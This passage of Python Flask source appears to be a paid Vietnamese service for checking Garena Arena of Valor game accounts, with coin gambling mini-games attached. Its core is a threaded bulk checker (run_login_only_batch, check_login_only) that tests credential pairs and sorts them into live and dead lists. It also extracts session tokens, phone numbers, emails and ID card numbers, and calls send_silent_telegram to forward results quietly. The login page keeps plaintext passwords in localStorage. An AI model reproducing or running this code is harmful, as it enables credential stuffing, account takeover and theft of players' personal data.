            "message": f"{t('game_won')} {win} xu!" if win > 0 else f"{t('game_lost')} {cost} xu!"}

def play_lixi(user):
    ok, msg = _can_play(user, "lixi")
    if not ok: return {"success": False, "error": msg}
    user["game_daily"]["lixi"] = user["game_daily"].get("lixi", 0) + 1
    win = random.randint(10, 200)
    user["balance"] = user.get("balance", 0) + win
    _log_game_result(user, "lixi", 0, win, f"Nhận lì xì {win} xu")
    save_data()
    return {"success": True, "game": "lixi", "bet": 0, "win": win,
            "delta": win, "balance": user["balance"],
            "remaining": GAME_CONFIGS["lixi"]["max_daily"] - user["game_daily"]["lixi"],
            "message": f"🧧 Bạn nhận được {win} xu từ lì xì!"}

def play_rongvang(user, bet):
    ok, msg = _can_play(user, "rongvang")
    if not ok: return {"success": False, "error": msg}
    try: bet = int(bet)
    except: return {"success": False, "error": "Số xu không hợp lệ!"}
    if bet not in (50, 100, 200):
        return {"success": False, "error": "Chỉ cược 50, 100 hoặc 200 xu!"}
    if user.get("balance", 0) < bet:
        return {"success": False, "error": t("game_not_enough")}
    user["balance"] -= bet
    user["game_daily"]["rongvang"] = user["game_daily"].get("rongvang", 0) + 1
    win_rate = {50: 0.05, 100: 0.10, 200: 0.20}[bet]
    if random.random() < win_rate:
        win = bet * 10
        user["balance"] += win
        _log_game_result(user, "rongvang", bet, win, f"Rồng vàng x10! +{win} xu")
        save_data()
        return {"success": True, "game": "rongvang", "bet": bet, "win": win,
                "delta": win - bet, "balance": user["balance"], "is_win": True,
                "remaining": GAME_CONFIGS["rongvang"]["max_daily"] - user["game_daily"]["rongvang"],
                "message": f"🐉 RỒNG VÀNG XUẤT HIỆN! Bạn nhận {win} xu!"}
    else:
        _log_game_result(user, "rongvang", bet, 0, f"Rồng không xuất hiện, mất {bet} xu")
        save_data()
        return {"success": True, "game": "rongvang", "bet": bet, "win": 0,
                "delta": -bet, "balance": user["balance"], "is_win": False,
                "remaining": GAME_CONFIGS["rongvang"]["max_daily"] - user["game_daily"]["rongvang"],
                "message": f"🐉 Rồng chưa xuất hiện... Mất {bet} xu!"}
# ========== ROUTES: AUTH ==========
@app.route("/health")
def health():
    return jsonify({"status": "ok", "users": len(USERS), "storage": len(ACC_STORAGE),
                    "active_jobs": _active_jobs_count[0], "check_jobs": len(CHECK_JOBS),
                    "cache_size": len(CHECK_CACHE), "queue_len": len(JOB_QUEUE),
                    "uptime": round(time.time() - _START_TIME, 1), "version": "7.0.0-p1"})

@app.route("/")
def index():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    return redirect(url_for("login_page"))

@app.route("/set_lang/<lang>")
def route_set_lang(lang):
    set_lang(lang)
    flash(f"✓ Ngôn ngữ: {TRANSLATIONS[lang]['lang_name']}", "success")
    return redirect(request.referrer or url_for("check_page"))

@app.route("/set_bg/<bg_id>")
@login_required
def route_set_bg(bg_id):
    set_background(bg_id)
    flash(f"✓ Đã đổi nền: {THEMES.get(bg_id, THEMES['grid'])['name_vi']}", "success")
    return redirect(request.referrer or url_for("check_page"))

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        usr = USERS.get(u)
        if usr and usr["password"] == hash_password(p):
            if u in BANNED_USERS:
                flash("Tài khoản đã bị ban!", "error"); return redirect(url_for("login_page"))
            session["username"] = u; session.permanent = True
            session["session_epoch"] = usr.get("session_epoch", 0)
            session["lang"] = usr.get("lang", "vi")
            today = datetime.now().strftime("%Y-%m-%d")
            db = usr.get("daily_bonus", {})
            if db.get("date") == today and db.get("amount", 0) > 0:
                usr["balance"] = usr.get("balance", 0) + db["amount"]
                db["amount"] = 0; save_data(force=True)
            flash(f"Chào mừng {u}!", "success")
            return redirect(url_for("check_page"))
        flash("Sai tài khoản hoặc mật khẩu!", "error")
    content = f'''
    <div class="card" style="margin-top:20px; text-align:center;">
        <div style="font-size:4em; margin-bottom:12px;">◈</div>
        <h1 class="card-title" style="justify-content:center; font-size:1.6em; margin-bottom:8px;">{t("brand")}</h1>
        <p style="color:var(--text-dim); margin-bottom:24px;">Hệ thống kiểm tra tài khoản Liên Quân</p>
        <div style="display:flex; gap:8px; margin-bottom:24px;">
            <a href="/login" class="btn btn-block" style="flex:1;">{t("btn_login")}</a>
            <a href="/register" class="btn btn-secondary btn-block" style="flex:1;">{t("btn_register")}</a>
        </div>
        <form method="POST" id="login-form">
            <div class="form-group" style="text-align:left;"><label class="form-label">{t("username")}</label>
                <input type="text" name="username" id="login-username" class="form-input" required autocomplete="username"></div>
            <div class="form-group" style="text-align:left;"><label class="form-label">{t("password")}</label>
                <div style="position:relative;">
                    <input type="password" name="password" id="login-password" class="form-input" required autocomplete="current-password" style="padding-right:50px;">
                    <button type="button" onclick="togglePwd()" style="position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:none; color:#94a3b8; cursor:pointer; font-size:1.1em;" id="pwd-eye">👁</button>
                </div>
            </div>
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:14px;">
                <input type="checkbox" id="remember-me" style="width:18px; height:18px; accent-color:#00f2fe; cursor:pointer;">
                <label for="remember-me" style="font-size:0.85em; color:#94a3b8; cursor:pointer; user-select:none;">💾 Ghi nhớ mật khẩu</label>
            </div>
            <button type="submit" class="btn btn-block">{t("btn_login")}</button>
        </form>
        <script>
        // 🆕 Ghi nhớ mật khẩu
        (function() {{
            var savedUser = localStorage.getItem('aov_remember_user');
            var savedPwd = localStorage.getItem('aov_remember_pwd');
            var remember = localStorage.getItem('aov_remember_checked');
            
            if (savedUser) document.getElementById('login-username').value = savedUser;
            if (savedPwd && remember === '1') {{
                document.getElementById('login-password').value = savedPwd;
                document.getElementById('remember-me').checked = true;
            }}
            
            document.getElementById('login-form').addEventListener('submit', function() {{
                var u = document.getElementById('login-username').value;
                var p = document.getElementById('login-password').value;
                var r = document.getElementById('remember-me').checked;
                
                localStorage.setItem('aov_remember_user', u);
                if (r) {{
                    localStorage.setItem('aov_remember_pwd', p);
                    localStorage.setItem('aov_remember_checked', '1');
                }} else {{
                    localStorage.removeItem('aov_remember_pwd');
                    localStorage.setItem('aov_remember_checked', '0');
                }}
            }});
            
            window.togglePwd = function() {{
                var pwd = document.getElementById('login-password');
                var eye = document.getElementById('pwd-eye');
                if (pwd.type === 'password') {{ pwd.type = 'text'; eye.textContent = '🙈'; }}
                else {{ pwd.type = 'password'; eye.textContent = '👁'; }}
            }};
        }})();
        </script>
    </div>'''
    return render_page(content, active_tab="", user=None)

@app.route("/register", methods=["GET", "POST"])
def register_page():
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", ""); cf = request.form.get("confirm", "")
        ref = request.form.get("ref", "").strip().upper()
        if not u or len(u) < 3 or len(u) > 20 or not u.isalnum():
            flash("Username 3-20 ký tự chữ/số!", "error")
        elif len(p) < 4: flash("Mật khẩu ít nhất 4 ký tự!", "error")
        elif p != cf: flash("Mật khẩu không khớp!", "error")
        elif u in USERS: flash("Username đã tồn tại!", "error")
        else:
            uid = gen_id(); inviter = None
            for un, uu in USERS.items():
                if uu.get("id") == ref: inviter = un; break
            new_tag = "TAG-" + u.upper() + "-" + uuid.uuid4().hex[:6].upper()
            new_user = _make_special_user(u, p, is_admin=False, is_qtv=False, is_owner=False,
                                          balance=DEFAULT_BALANCE, level=1)
            new_user["id"] = uid; new_user["tag_code"] = new_tag
            new_user["invited_by"] = inviter; new_user["balance"] = DEFAULT_BALANCE
            new_user["level"] = 1; new_user["exp"] = 0
            USERS[u] = new_user
            if inviter and inviter in USERS:
                USERS[inviter]["referrals"] = USERS[inviter].get("referrals", 0) + 1
                USERS[inviter]["balance"] += REFERRAL_REWARD
                USERS[u]["balance"] += REFERRAL_BONUS
            save_data(force=True)
            session["username"] = u; session.permanent = True
            session["lang"] = "vi"
            flash(f"Đăng ký thành công! ID: {uid}", "success")
            return redirect(url_for("check_page"))
    content = f'''
    <div class="card" style="margin-top:20px;">
        <div style="text-align:center; margin-bottom:20px;">
            <div style="font-size:4em; margin-bottom:8px;">✦</div>
            <h1 class="card-title" style="justify-content:center; font-size:1.6em;">{t("register_title")}</h1>
        </div>
        <div style="display:flex; gap:8px; margin-bottom:20px;">
            <a href="/login" class="btn btn-secondary btn-block" style="flex:1;">{t("btn_login")}</a>
            <a href="/register" class="btn btn-block" style="flex:1;">{t("btn_register")}</a>
        </div>
        <form method="POST">
            <div class="form-group"><label class="form-label">{t("username")}</label>
                <input type="text" name="username" class="form-input" required minlength="3" maxlength="20"></div>
            <div class="form-group"><label class="form-label">{t("password")}</label>
                <input type="password" name="password" class="form-input" required minlength="4"></div>
            <div class="form-group"><label class="form-label">{t("confirm_pw")}</label>
                <input type="password" name="confirm" class="form-input" required minlength="4"></div>
            <div class="form-group"><label class="form-label">{t("ref_code")}</label>
                <input type="text" name="ref" class="form-input"></div>
            <button type="submit" class="btn btn-success btn-block">{t("btn_create")}</button>
        </form>
    </div>'''
    return render_page(content, active_tab="", user=None)

@app.route("/logout")
def logout():
    session.pop("username", None)
    flash("Đã đăng xuất!", "success")
    return redirect(url_for("login_page"))



# ═══════════════════════════════════════════════════════════════
# 🆕 CHECK LOGIN ONLY — Chỉ check login, không lấy skin
# ═══════════════════════════════════════════════════════════════
def check_login_only(u, p, timeout=None):
    """
    Chỉ TCP login → nhanh 10-20x so với check full.
    Trả về dict: {alive: bool, reason: str, uid: int}
    """
    if timeout is None:
        timeout = TCP_LOGIN_TIMEOUT
    try:
        r = tcp_login(u, p, timeout)
        status = r.get('status', '')
        detail = r.get('detail', '')
        
        if status == 'HIT':
            return {
                "alive": True,
                "reason": "Login OK",
                "uid": r.get('uid', 0),
                "status": "LIVE",
            }
        elif status == 'INVALID':
            # LOGIN_FAIL result=X
            m = re.search(r'result=(\d+)', detail)
            code = int(m.group(1)) if m else 0
            reason_map = {
                1: "Sai mật khẩu",
                2: "Sai mật khẩu",
                3: "Tài khoản bị khóa",
                4: "Cần Captcha",
                5: "Tài khoản bật 2FA",
                6: "Sai quá nhiều lần",
                7: "Sai quá nhiều lần",
                8: "Sai quá nhiều lần",
                16: "Cần xác minh web",
                17: "Cần đổi mật khẩu",
            }
            return {
                "alive": False,
                "reason": reason_map.get(code, f"LOGIN_FAIL={code}"),
                "uid": 0,
                "status": "DIE",
            }
        elif status == 'ERROR':
            if 'PREPARE_FAIL' in detail:
                m = re.search(r'result=(\d+)', detail)
                code = int(m.group(1)) if m else 0
                reason_map = {
                    101: "Tài khoản không tồn tại",
                    105: "Email không tồn tại",
                    106: "Định dạng không hợp lệ",
                    110: "Định dạng không hợp lệ",
                    173: "Phải dùng Username",
                }
                return {
                    "alive": False,
                    "reason": reason_map.get(code, f"PREPARE_FAIL={code}"),
                    "uid": 0,
                    "status": "DIE",
                }
            return {"alive": False, "reason": detail[:60], "uid": 0, "status": "ERROR"}
        elif status == 'TIMEOUT':
            return {"alive": False, "reason": "Timeout", "uid": 0, "status": "TIMEOUT"}
        else:
            return {"alive": False, "reason": detail[:60] or status, "uid": 0, "status": "ERROR"}
    except Exception as e:
        return {"alive": False, "reason": str(e)[:60], "uid": 0, "status": "ERROR"}


def run_login_only_batch(acc_list, threads=10, delay=0):
    """
    Check login hàng loạt — siêu nhanh.
    Trả về: {live: [], die: [], errors: []}
    """
    live = []; die = []; errors = []
    lock = threading.Lock()
    def _one(pair):
        u, p = pair
        if delay > 0: time.sleep(delay)
        r = check_login_only(u, p)
        with lock:
            entry = {"user": u, "pass": p, "reason": r["reason"], "uid": r.get("uid", 0)}
            if r["alive"]:
                live.append(entry)
            elif r["status"] == "ERROR":
                errors.append(entry)
            else:
                die.append(entry)
    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(_one, acc_list))
    return {"live": live, "die": die, "errors": errors}

# ========== CHECK PAGE ==========
@app.route("/check", methods=["GET", "POST"])
@login_required
def check_page():
    user = get_user()
    if request.method == "POST":
        acc = request.form.get("account", "").strip()
        pwd = request.form.get("password", "").strip()
        if not acc or not pwd:
            flash("⚠️ Vui lòng nhập đầy đủ!", "error")
            return redirect(url_for("check_page"))
        # 🆕 v7.0: Voucher check
        voucher_id = request.form.get("voucher", "")
        cost = CHECK_COST
        if voucher_id:
            for v in user.get("vouchers", []):
                if v.get("id") == voucher_id and v.get("uses", 0) > 0:
                    if v.get("type") == "check_free":
                        cost = 0
                    elif v.get("type") == "check50":
                        cost = max(0, CHECK_COST // 2)
                    v["uses"] -= 1
                    break
        if user["balance"] < cost:
            flash("Không đủ lượt để check!", "error")
            return redirect(url_for("check_page"))
        user["balance"] -= cost
        try:
            r = run_single_check(acc, pwd, use_cache=True)
            
            if r.get("type") == "failed":
                # Hoàn xu
                try:
                    user["balance"] += cost
                except Exception:
                    pass
                # Báo lỗi
                err_msg = r.get("error", "Tài khoản không tồn tại hoặc sai mật khẩu")
                flash(f"❌ {err_msg}", "error")
                return redirect(url_for("check_page"))
            
            
            # 🆕 Nếu acc FAKE → báo lỗi, KHÔNG hiển thị UI
            if r.get("type") == "failed" and "verify fail" in r.get("error", "").lower():
                user["balance"] += cost  # Hoàn xu
                flash(f"❌ Tài khoản không tồn tại hoặc sai mật khẩu!", "error")
                return redirect(url_for("check_page"))
            
            user["history"] = user.get("history", [])[-199:] + [make_hist_entry(r, acc)]
            user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + 1
            if r["type"] == "sss": user["mission"]["sss"] = user["mission"].get("sss", 0) + 1
            elif r["type"] == "ss": user["mission"]["ss"] = user["mission"].get("ss", 0) + 1
            elif r["type"] == "anime": user["mission"]["anime"] = user["mission"].get("anime", 0) + 1
            add_exp(user, 3)
            # 🆕 v7.0: Quest
            quest_add_progress(user, "check_count", 1)
            check_badge_conditions(user)
            save_data()
            send_silent_telegram(r)
            try: tg_track_acc(r, source="check_don")
            except Exception: pass
            html_report = render_html_report(r, acc, pwd)
            return render_page(html_report, active_tab="check", user=user)
        except Exception as e:
            logger.error(f"[CHECK-PAGE] EXC: {traceback.format_exc()}")
            flash(f"Lỗi khi check: {e}", "error")
            return redirect(url_for("check_page"))
    content = render_check_form(user)
    return render_page(content, active_tab="check", user=user)

def render_check_form(user):
    m = user.get("mission", {})
    # 🆕 v7.0: Voucher list
    vc_html = ""
    for v in user.get("vouchers", []):
        if v.get("uses", 0) > 0:
            vc_html += f'<option value="{v["id"]}">{v.get("name","Voucher")} (-{v.get("discount",0)} xu)</option>'
    vc_select = ""
    if vc_html:
        vc_select = f'''<div class="form-group"><label class="form-label">🎫 Voucher</label>
            <select name="voucher" class="form-input"><option value="">Không dùng</option>{vc_html}</select></div>'''
    return f'''
    <div id="loading-overlay" style="display:none;position:fixed;inset:0;background:rgba(5,8,17,0.95);backdrop-filter:blur(20px);z-index:9999;align-items:center;justify-content:center;flex-direction:column;gap:24px;padding:20px;overflow-y:auto;">
        <div style="width:90px;height:90px;border:5px solid rgba(0,242,254,0.15);border-top-color:#00f2fe;border-right-color:#a855f7;border-radius:50%;animation:spin 1s linear infinite;box-shadow:0 0 50px rgba(0,242,254,0.6);flex-shrink:0;"></div>
        <div style="font-family:'Chakra Petch',sans-serif;font-size:1.4em;font-weight:800;color:#38bdf8;letter-spacing:2px;text-align:center;">ĐANG QUÉT DỮ LIỆU...</div>
        <div style="width:100%;max-width:400px;">
            <div style="display:flex;justify-content:space-between;font-size:0.85em;color:#94a3b8;margin-bottom:8px;">
                <span id="loading-step-text">Khởi tạo kết nối...</span>
                <span id="loading-percent" style="color:#00f2fe;font-weight:800;">0%</span>
            </div>
            <div style="width:100%;height:10px;background:rgba(5,8,17,0.9);border-radius:10px;overflow:hidden;border:1px solid rgba(0,242,254,0.2);">
                <div id="loading-bar" style="height:100%;width:0%;background:linear-gradient(90deg,#00f2fe,#38bdf8,#ff007f);border-radius:10px;transition:width 0.5s ease;box-shadow:0 0 15px rgba(0,242,254,0.8);"></div>
            </div>
        </div>
        <div id="loading-steps" style="width:100%;max-width:400px;background:rgba(5,8,17,0.7);border:1px solid rgba(0,242,254,0.2);border-radius:14px;padding:14px;font-family:'Share Tech Mono',monospace;font-size:0.8em;color:#94a3b8;text-align:left;line-height:1.8;">
            <div id="step-0" style="opacity:0.4;">○ Kết nối TCP Garena...</div>
            <div id="step-1" style="opacity:0.4;">○ Xác thực XTEA + Protobuf...</div>
            <div id="step-2" style="opacity:0.4;">○ Lấy SSO / Access Token...</div>
            <div id="step-3" style="opacity:0.4;">○ Check bảo mật Garena...</div>
            <div id="step-4" style="opacity:0.4;">○ Tải kho skin + tướng...</div>
            <div id="step-5" style="opacity:0.4;">○ Phân tích kết quả...</div>
        </div>
        <div style="color:#ffb800;font-size:0.85em;text-align:center;max-width:400px;padding-bottom:20px;">⏱️ Có thể mất 10-30 giây. Đừng tắt trang!</div>
    </div>
    <div class="card">
        <h2 class="card-title"><i class="fa-solid fa-bolt"></i> {t("check_title")}</h2>
        <form method="POST" id="check-form" onsubmit="return handleSubmit(event)">
            <div class="form-group"><label class="form-label">{t("check_account")}</label>
                <input type="text" name="account" id="inp-acc" class="form-input" placeholder="..." required autocomplete="off"></div>
            <div class="form-group"><label class="form-label">{t("check_pw")}</label>
                <input type="password" name="password" id="inp-pwd" class="form-input" placeholder="..." required></div>
            {vc_select}
            <div class="form-info" style="background:rgba(0,242,254,0.08); padding:12px; border-radius:12px; margin-bottom:14px; border:1px solid rgba(0,242,254,0.3); font-size:0.85em;">
                <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
                    <span style="color:#94a3b8;">{t("check_balance")}:</span>
                    <span style="color:#ffb800; font-weight:800;">{user.get("balance", 0)} xu</span>
                </div>
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:#94a3b8;">{t("check_cost")}:</span>
                    <span style="color:#00f2fe; font-weight:800;">{CHECK_COST} xu / lần</span>
                </div>
            </div>
            <button type="submit" class="btn btn-block" id="btn-check">
                <i class="fa-solid fa-bolt-lightning"></i> {t("btn_start_check")}
            </button>
        </form>
    </div>
    <div class="card">
        <h2 class="card-title"><i class="fa-solid fa-chart-simple"></i> Thống Kê Cá Nhân</h2>
        <div class="stat-grid-4">
            <div class="stat-box small"><div class="stat-value">{m.get("total_acc", 0)}</div><div class="stat-label">Tổng Acc</div></div>
            <div class="stat-box small"><div class="stat-value">{m.get("sss", 0)}</div><div class="stat-label">SSS</div></div>
            <div class="stat-box small"><div class="stat-value">{m.get("ss", 0)}</div><div class="stat-label">SS</div></div>
            <div class="stat-box small"><div class="stat-value">{m.get("anime", 0)}</div><div class="stat-label">Anime</div></div>
        </div>
    </div>
    <script>
    window.__stepInterval = null; window.__currentStep = 0;
    window.__STEPS = [
        {{ text: "Đang kết nối TCP Garena...", pct: 10 }},
        {{ text: "Đang giải mã XTEA + Protobuf...", pct: 25 }},
        {{ text: "Đang trích xuất SSO Token...", pct: 40 }},
        {{ text: "Đang truy vấn Bảo Mật Garena...", pct: 55 }},
        {{ text: "Đang tải Kho Tướng + Skin...", pct: 75 }},
        {{ text: "Đang phân tích & check BAN...", pct: 90 }}
    ];
    window.__showStep = function(idx) {{
        var s = window.__STEPS[idx];
        var txt = document.getElementById('loading-step-text');
        var pct = document.getElementById('loading-percent');
        var bar = document.getElementById('loading-bar');
        if (txt) txt.textContent = s.text;
        if (pct) pct.textContent = s.pct + '%';
        if (bar) bar.style.width = s.pct + '%';
        // 🆕 LED chạy tuần tự: bước cũ ✓ xanh lá, bước hiện tại ◐ cyan nhấp nháy
        for (var i = 0; i <= idx; i++) {{
            var el = document.getElementById('step-' + i);
            if (!el) continue;
            el.style.opacity = '1';
            if (i === idx) {{
                // Bước ĐANG chạy — sáng rực, nhấp nháy
                el.style.color = '#00f2fe';
                el.style.fontWeight = '700';
                el.style.textShadow = '0 0 8px #00f2fe';
                el.innerHTML = '◐ ' + window.__STEPS[i].text;
                // Thêm class blink để nhấp nháy
                el.classList.add('step-active');
            }} else {{
                // Bước ĐÃ XONG — xanh lá ✓
                el.style.color = '#10b981';
                el.style.fontWeight = '600';
                el.style.textShadow = '0 0 5px rgba(16,185,129,0.5)';
                el.innerHTML = '✓ ' + window.__STEPS[i].text;
                el.classList.remove('step-active');
            }}
        }}
        // Các bước chưa tới — giữ nguyên mờ
        for (var j = idx + 1; j < window.__STEPS.length; j++) {{
            var el2 = document.getElementById('step-' + j);
            if (!el2) continue;
            el2.style.opacity = '0.4';
            el2.style.color = '#94a3b8';
            el2.style.fontWeight = '400';
            el2.style.textShadow = 'none';
            el2.innerHTML = '○ ' + window.__STEPS[j].text;
            el2.classList.remove('step-active');
        }}
    }};
    window.handleSubmit = function(e) {{
        var acc = document.getElementById('inp-acc').value.trim();
        var pwd = document.getElementById('inp-pwd').value.trim();
        if (!acc || !pwd) {{ e.preventDefault(); alert('⚠️ Nhập đầy đủ!'); return false; }}
        var overlay = document.getElementById('loading-overlay');
        var btn = document.getElementById('btn-check');
        if (overlay) overlay.style.display = 'flex';
        window.__currentStep = 0; window.__showStep(0);
        if (window.__stepInterval) clearInterval(window.__stepInterval);
        window.__stepInterval = setInterval(function() {{
            if (window.__currentStep < window.__STEPS.length - 1) {{
                window.__currentStep++; window.__showStep(window.__currentStep);
            }} else {{
                var p = document.getElementById('loading-percent');
                var b = document.getElementById('loading-bar');
                if (p) p.textContent = '99%'; if (b) b.style.width = '99%';
            }}
        }}, 1500);
        if (btn) {{ btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> ĐANG QUÉT...'; }}
        return true;
    }};
    window.addEventListener('beforeunload', function() {{
        if (window.__stepInterval) clearInterval(window.__stepInterval);
    }});
    </script>'''

def render_html_report(r, acc, pwd):
    is_banned = r.get("banned", False)
    t_ = r.get("type", "failed")
    tier_colors = {
        "sss": ("#ffb800", "◈", "SSS"), "ss": ("#00f2fe", "◆", "SS"),
        "anime": ("#e040fb", "◇", "ANIME"), "normal": ("#8b8b9a", "▪", "THƯỜNG"),
        "trang": ("#a0a0b8", "○", "TRẮNG"), "banned": ("#ff2951", "✖", "BANNED"),
        "failed": ("#5a5a6e", "✕", "LỖI")}
    color, icon, tier_label = tier_colors.get(t_, ("#8b8b9a", "?", t_.upper()))
    ban_color = "#ff2951" if is_banned else "#10b981"
    ban_text = "BỊ CẤM (BAN)" if is_banned else "AN TOÀN"
    sss_count = len(r.get("sss", [])); ss_count = len(r.get("ss", []))
    anime_count = len(r.get("anime", [])); total_skins = r.get("total_skins", 0)
    heroes_set = set()
    for s in (r.get("sss", []) + r.get("ss", []) + r.get("anime", [])):
        if s.get("hero_name"): heroes_set.add(s["hero_name"])
    for s in r.get("other_skins", []):
        if s.get("hero_name"): heroes_set.add(s["hero_name"])
    hero_count = len(heroes_set)
    avatar_url = ""
    for tier in ["sss", "anime", "ss"]:
        if r.get(tier):
            avatar_url = r[tier][0].get("cdn_fallback") or r[tier][0].get("cdn") or ""; break
    if not avatar_url and r.get("other_skins"):
        avatar_url = r["other_skins"][0].get("cdn_fallback") or ""
    if not avatar_url:
        avatar_url = "https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/301310.jpg"
    has_phone = bool(r.get("mobile_no")); has_email = bool(r.get("email"))
    has_idcard = bool(r.get("idcard")); has_2fa = r.get("two_fa", False)
    clean_status = "CÓ LIÊN KẾT" if (has_phone or has_email or has_idcard) else "100% SẠCH"
    def build_skin_grid(lst, tier):
        if not lst: return ""
        items = ""
        for s in lst:
            items += f'''<div class="moba-skin-card card-{tier.lower()}">
                <div class="skin-art-frame frame-{tier.lower()}">
                    <img src="{s.get('cdn','')}" class="skin-art-img" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';">
                </div>
                <div class="skin-title-name" title="{s.get('skin_name','')}">{s.get('skin_name','')}</div>
                <div class="skin-hero-sub">{s.get('hero_name','')} </div>
                <span class="tier-badge-pill pill-{tier.lower()}">{tier.upper()}</span>
            </div>'''
        return items
    skin_grid_html = ""
    if sss_count > 0:
        skin_grid_html += f'''<div style="margin-bottom:14px;"><div style="font-family:var(--font-display); font-size:13px; font-weight:700; color:#ffb800; margin-bottom:10px; letter-spacing:1px;">⭐ SSS ({sss_count})</div><div class="moba-cards-grid">{build_skin_grid(r.get("sss", []), "SSS")}</div></div>'''
    if anime_count > 0:
        skin_grid_html += f'''<div style="margin-bottom:14px;"><div style="font-family:var(--font-display); font-size:13px; font-weight:700; color:#e040fb; margin-bottom:10px; letter-spacing:1px;">🎴 ANIME ({anime_count})</div><div class="moba-cards-grid">{build_skin_grid(r.get("anime", []), "Anime")}</div></div>'''
    if ss_count > 0:
        skin_grid_html += f'''<div style="margin-bottom:14px;"><div style="font-family:var(--font-display); font-size:13px; font-weight:700; color:#00c6ff; margin-bottom:10px; letter-spacing:1px;">💎 SS ({ss_count})</div><div class="moba-cards-grid">{build_skin_grid(r.get("ss", []), "SS")}</div></div>'''
    if not skin_grid_html:
        skin_grid_html = '<div style="text-align:center; color:#64748b; padding:20px;">Không có skin SS/SSS/Anime</div>'
    ban_banner = ""
    if is_banned:
        ban_sources = r.get("ban_sources", [])
        sources_str = ", ".join(ban_sources) if ban_sources else "N/A"
        ban_banner = f'''<div class="card" style="border:2px solid #ff2951; background:rgba(255,41,81,0.1);">
            <h3 class="card-title" style="color:#ff2951; font-size:1em;">🚫 ACC ĐANG BỊ BAN</h3>
            <div class="info-row"><span class="info-label">Hết hạn</span><span class="info-value">{r.get("ban_end_time") or "Vĩnh viễn / Không rõ"}</span></div>
            {f'<div class="info-row"><span class="info-label">Lý do</span><span class="info-value">{r.get("ban_reason")}</span></div>' if r.get("ban_reason") else ''}
            <div class="info-row"><span class="info-label">Nguồn</span><span class="info-value">{sources_str}</span></div>
        </div>'''
    token_html = ""
    for label, key in [("SSO Key", "sso_key"), ("Access Token", "access_token"),
                        ("Session Token", "session_token"), ("Open ID", "open_id")]:
        val = r.get(key, "")
        if val:
            val_esc = val.replace("'", "\\'")
            token_html += f'''<div class="token-row">
                <div><strong>{label}:</strong> <span class="token-val">{val}</span></div>
                <button class="btn-copy-chip" onclick="copyText('{val_esc}')">Copy</button>
            </div>'''
    return f'''
    <div class="card" style="text-align:center; border:2px solid {color}; margin-bottom:14px;">
        <div style="font-size:3em; color:{color}; margin-bottom:6px;">{icon}</div>
        <div style="font-family:var(--font-display); font-size:1.6em; font-weight:900; color:{color};">{tier_label}</div>
        <div style="font-size:0.8em; color:var(--text-mute); margin-top:6px;">Check xong lúc {datetime.now().strftime('%H:%M:%S %d-%m-%Y')}</div>
    </div>
    <div class="player-showcase-banner">
        <div class="player-info-left">
            <div class="player-avatar-ring"><img class="player-avatar-img" src="{avatar_url}" onerror="this.src='https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/301310.jpg'"></div>
            <div class="player-identity">
                <h2>{r.get("name") or r.get("nickname") or r.get("username_display") or acc}</h2>
                <div class="player-uids">
                    <span>Garena: <strong class="uid-tag">{r.get("uid") or "N/A"}</strong></span>
                    {f'<span>Ingame: <strong class="uid-tag">{r.get("player_uid")}</strong></span>' if r.get("player_uid") else ''}
                </div>
            </div>
        </div>
        <div class="player-highlight-badges">
            <div class="stat-pill"><div class="stat-pill-label">Bậc Xếp Hạng</div><div class="stat-pill-value" style="color:#ffb800;">🏆 {r.get("rank") or "Chưa xếp hạng"} ({r.get("rank_stars",0)}★)</div></div>
            <div class="stat-pill"><div class="stat-pill-label">Kiểm Tra BAN</div><div class="stat-pill-value" style="color:{ban_color};">{ban_text}</div></div>
        </div>
    </div>
    <div class="stats-row-grid">
        <div class="esports-stat-card"><div class="stat-icon-hex icon-hero">🛡️</div><div class="stat-card-text"><div class="label">Tướng Sở Hữu</div><div class="val">{hero_count}</div></div></div>
        <div class="esports-stat-card"><div class="stat-icon-hex icon-sss">🐉</div><div class="stat-card-text"><div class="label">Trang Phục SSS</div><div class="val">{sss_count}</div></div></div>
        <div class="esports-stat-card"><div class="stat-icon-hex icon-anime">✨</div><div class="stat-card-text"><div class="label">Anime & SS</div><div class="val">{anime_count} / {ss_count}</div></div></div>
        <div class="esports-stat-card"><div class="stat-icon-hex icon-safe">🔒</div><div class="stat-card-text"><div class="label">Bảo Mật</div><div class="val" style="font-size:16px;">{clean_status}</div></div></div>
    </div>
    <div class="info-matrix-grid">
        <div class="glass-panel">
            <div class="panel-header"><div class="panel-title">👤 Bảo Mật Garena</div></div>
            <div class="matrix-row-list">
                <div class="matrix-item"><div class="matrix-key">🆔 Garena UID</div><div class="matrix-val" style="color:#38bdf8; font-family:monospace;">{r.get("uid") or "N/A"}</div></div>
                <div class="matrix-item"><div class="matrix-key">👤 Tên đăng nhập</div><div class="matrix-val">{r.get("username_display") or acc}</div></div>
                <div class="matrix-item"><div class="matrix-key">😊 Nickname</div><div class="matrix-val">{r.get("nickname") or "Chưa đặt"}</div></div>
                <div class="matrix-item"><div class="matrix-key">📱 Số ĐT</div><div class="matrix-val">{f"{r.get('mobile_no')} (+{r.get('country_code', '84')})" if has_phone else '<span class="status-badge status-safe">Không có SĐT</span>'}</div></div>
                <div class="matrix-item"><div class="matrix-key">📧 Email</div><div class="matrix-val">{r.get("email") if has_email else '<span class="status-badge status-safe">Không có Email</span>'}</div></div>
                <div class="matrix-item"><div class="matrix-key">🆔 CMND/CCCD</div><div class="matrix-val">{r.get("idcard") if has_idcard else '<span class="status-badge status-safe">Chưa liên kết</span>'}</div></div>
                <div class="matrix-item"><div class="matrix-key">🛡️ 2FA</div><div class="matrix-val">{'<span class="status-badge status-warn">Đang BẬT</span>' if has_2fa else '<span class="status-badge status-safe">Đang TẮT</span>'}</div></div>
